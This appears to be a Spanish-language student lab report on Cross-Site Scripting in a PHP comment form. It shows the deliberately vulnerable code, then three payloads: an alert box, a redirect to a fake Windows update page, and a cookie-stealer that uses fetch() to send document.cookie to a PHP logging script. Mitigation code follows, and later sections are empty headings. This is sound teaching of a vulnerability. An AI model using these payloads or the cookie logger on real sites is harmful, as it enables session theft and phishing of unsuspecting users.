# 2. Documentación de vulnerabilidades de inyección de datos de entrada

En esta documentación se analiza la vulnerabilidad **Cross-Site Scripting (XSS)** presente en una aplicación web desarrollada en PHP.  

Se muestra:  

- El **código vulnerable**.
- La **explotación de la vulnerabilidad**.
- La **implementación de mitigaciones**.
- Una **batería de pruebas** para verificar la solución.

---

## 2.1 Código vulnerable

A continuación muestro el contenido del archivo que voy a usar `comment.php`, el cual presenta una vulnerabilidad de **Cross-Site Scripting (XSS)** debido a que los datos introducidos por el usuario se muestran en la página sin ningún tipo de validación ni sanitización.

![PHP](./images/apartado_dos/commentphp.png)

**`comment.php`**
```
<?php
// Activar errores en entorno de prácticas (opcional)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$comment = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // SIN SEGURIDAD: se guarda el comentario tal cual
    $comment = $_POST['comment'] ?? '';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Comentarios INSEGUROS</title>
</head>
<body>
    <h1>Comentarios (versión insegura)</h1>

    <form method="post">
        <label for="comment">Comentario:</label><br>
        <!-- SIN htmlspecialchars: se muestra el contenido sin escapar -->
        <textarea name="comment" id="comment" rows="4" cols="50"><?= $comment ?></textarea><br>
        <button type="submit">Enviar</button>
    </form>

    <?php if ($comment !== ''): ?>
        <h2>Comentario recibido (SIN sanitizar)</h2>
        <!-- Aquí también se imprime directamente, vulnerable a XSS -->
        <p><?= $comment ?></p>
    <?php endif; ?>
</body>
</html>
```

**Explicación de la vulnerabilidad**  

- La aplicación recibe un comentario enviado por el usuario y lo muestra directamente en la página sin aplicar ningún mecanismo de seguridad.

```php
$comment = $_POST['comment'];
```
- Posteriormente se imprime directamente en el HTML:

```php
<p><?= $comment ?></p>
```
- Esto permite que un atacante introduzca código HTML o JavaScript que será ejecutado por el navegador del usuario, así es como funciona la vulnerabilidad **Cross-Site Scripting (XSS)**.
---

### 2.1.1 Explotación 1 - XSS clásico

A continuación se muestra la explotación 1.

![XPLOIT1](./images/apartado_dos/xploit1.png)

**Payload utilizado**

```html
<script>alert('Vulnerabilidad XSS!')</script>
<h2 style="color:red;">Explotación 1</h2>
```
**Explicación**

- Este ataque inserta una etiqueta `<script>` en el campo de comentario.
- Debido a que la aplicación no filtra ni escapa el contenido, el navegador interpreta el script como código ejecutable.

**Resultado**

- Cuando la página muestra el comentario, el navegador ejecuta el script y aparece una ventana emergente `(alert)`.
- Esto confirma que la aplicación es vulnerable a XSS.

---

### 2.1.2 Explotación 2 - Redirección maliciosa

A continuación se muestra la explotación 2.

![XPLOIT2](./images/apartado_dos/xploit2.png)

**Payload utilizado**

```html
<script>window.location='https://fakeupdate.net/win10ue/'</script>
<h2 style="color:red;">Explotación 2</h2>
```
**Explicación**

- Este ataque utiliza JavaScript para redirigir automáticamente al usuario a otra página web mediante: `window.location`.
- Debido a la vulnerabilidad XSS, el script se ejecuta cuando la página muestra el comentario.

**Impacto**  

Un atacante podría redirigir a los usuarios a:

- Páginas de phishing.
- Páginas con malware.
- Páginas con actualizaciones falsas del sistema.

En mi caso utilizo [fakeupdate.net](https://fakeupdate.net/win10ue/), una de sus páginas falsas que simula una actualización de Windows 10.  

---

### 2.1.3 Explotación 3 - Robo de cookies (Cookie Stealing)

A continuación se muestra la explotación 3.

- Usando la herramienta **PHP Cookie Stealer** que es una herramienta que puede usarse en pruebas de penetración y ataques XSS para robar cookies de navegador a las víctimas. La herramienta funciona configurando un servidor que escucha las solicitudes entrantes con un valor de cookie específico. Cuando se recibe una solicitud, la herramienta registra diversas informaciones sobre la petición, incluyendo la fecha y hora, la dirección IP del cliente, el agente de usuario, el referente y el valor de las cookies, en un archivo.

- Esta herramienta puede ser utilizada por atacantes para robar información sensible, como tokens de sesión y credenciales de autenticación, de usuarios desprevenidos. Robando las cookies del navegador de un usuario, un atacante puede obtener acceso no autorizado a la cuenta del usuario y realizar acciones en su nombre.

- En esta explotación se demuestra cómo una vulnerabilidad Cross-Sies Scripting (XSS) puede utilizarse para robar cookies de sesión de los usuarios.

- Las cookies son pequeños fragmentos de información que los sitios web almacenan en el navegador del usuario para mantener el estado de la sesión, por ejemplo para recordar que un usuario ha iniciado sesión en una aplicación.

- Si un atacante consigue acceder a estas cookies, podría suplantar la identidad del usuario sin necesidad de conocer su contraseña.



![XPLOIT3](./images/apartado_dos/xploit3.png)

**`./www/cookieStealer/index.php`**

```
<?php
// Obtener la fecha actual
$date = date("Y/m/d H:i:s");

// Obtener la dirección IP, User Agent y Referer
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'No User Agent';
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';

// Obtener el parámetro 'cookie' de la URL
$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : 'No Cookie Provided';

// Escapar las variables para evitar inyecciones de código
$cookie = htmlspecialchars($cookie, ENT_QUOTES, 'UTF-8');
$user_agent = htmlspecialchars($user_agent, ENT_QUOTES, 'UTF-8');
$referer = htmlspecialchars($referer, ENT_QUOTES, 'UTF-8');

// Intentar abrir el archivo de registro
$file = fopen("cookies.txt", "a");

if ($file === false) {
    // Si no se puede abrir el archivo, responder con error
    echo json_encode(["status" => 500, "message" => "Error opening file"]);
    exit();
}

// Escribir la información en el archivo
fwrite($file, "[+] Date: {$date}\n[+] IP: {$ip}\n[+] UserAgent: {$user_agent}\n[+] Referer: {$referer}\n[+] Cookies: {$cookie}\n---\n");

// Cerrar el archivo
fclose($file);

// Responder con un JSON de éxito
echo json_encode(["status" => 200]);
?>
```
```
<script>
fetch("http://localhost/cookieStealer/index.php?cookie=" + document.cookie);
</script>
<h2 style="color:red;">Explotación 3</h2>

```
---

## 2.2 Mitigación

**`comment.php`**
```
<?php
// ==========================
// CONFIGURACIÓN DE ERRORES
// ==========================
ini_set('display_errors', 1);
error_reporting(E_ALL);

// ==========================
// INICIAR SESIÓN (CSRF)
// ==========================
session_start();

// Generar token CSRF si no existe
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// ==========================
// VARIABLES
// ==========================
$comment = '';
$error = '';
$success = '';

// ==========================
// PROCESAMIENTO DEL FORMULARIO
// ==========================
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // ==========================
    // 1. VERIFICACIÓN CSRF
    // ==========================
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        $error = "Error: Token CSRF inválido.";
    } else {

        // ==========================
        // 2️. MITIGACIÓN 1:
        // USO DE filter_input()
        // ==========================
        $comment = filter_input(INPUT_POST, 'comment', FILTER_UNSAFE_RAW);

        if ($comment === null) {
            $comment = '';
        }

        // Eliminar espacios al inicio y final
        $comment = trim($comment);

        // ==========================
        // 3️. MITIGACIÓN 2:
        // VALIDACIÓN DE ENTRADA
        // ==========================

        $length = mb_strlen($comment, 'UTF-8');

        if ($length === 0) {
            $error = "El comentario no puede estar vacío.";
        } elseif ($length > 500) {
            $error = "El comentario no puede superar los 500 caracteres.";
        }
        // Permitir letras, números, espacios y puntuación básica
        elseif (!preg_match('/^[\p{L}\p{N}\s.,!?¡¿()@#%&\-]*$/u', $comment)) {
            $error = "El comentario contiene caracteres no permitidos.";
        }
        else {

            // ==========================
            // 4️. MITIGACIÓN 3:
            // SANITIZAR CON htmlspecialchars()
            // ==========================
            $comment = htmlspecialchars(
                $comment,
                ENT_QUOTES | ENT_SUBSTITUTE,
                'UTF-8'
            );

            $success = "Comentario publicado correctamente.";
        }
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Comentarios Seguros</title>
</head>
<body>

<h1>Formulario seguro con 3 mitigaciones</h1>

<?php if ($error): ?>
    <p style="color:red;">
        <?= htmlspecialchars($error, ENT_QUOTES, 'UTF-8') ?>
    </p>
<?php endif; ?>

<?php if ($success): ?>
    <p style="color:green;">
        <?= htmlspecialchars($success, ENT_QUOTES, 'UTF-8') ?>
    </p>
<?php endif; ?>

<form method="post">

    <label>Comentario:</label><br>

    <textarea name="comment" rows="4" cols="50"></textarea><br><br>

    <!-- Token CSRF -->
    <input type="hidden"
           name="csrf_token"
           value="<?= htmlspecialchars($_SESSION['csrf_token'], ENT_QUOTES, 'UTF-8') ?>">

    <button type="submit">Enviar</button>

</form>

<?php if ($success): ?>
    <h2>Comentario recibido:</h2>
    <p><?= $comment ?></p>
<?php endif; ?>

</body>
</html>
```
---

### 2.2.1 MITIGACIÓN 1 — Uso de filter_input()

**`comment.php`**

---

### 2.2.2 MITIGACIÓN 2 — Validación de entrada

**`comment.php`**

---

### 2.2.3 MITIGACIÓN 3 — Sanitización con htmlspecialchars()

**`comment.php`**

---

## 2.3 BATERÍA DE PRUEBAS
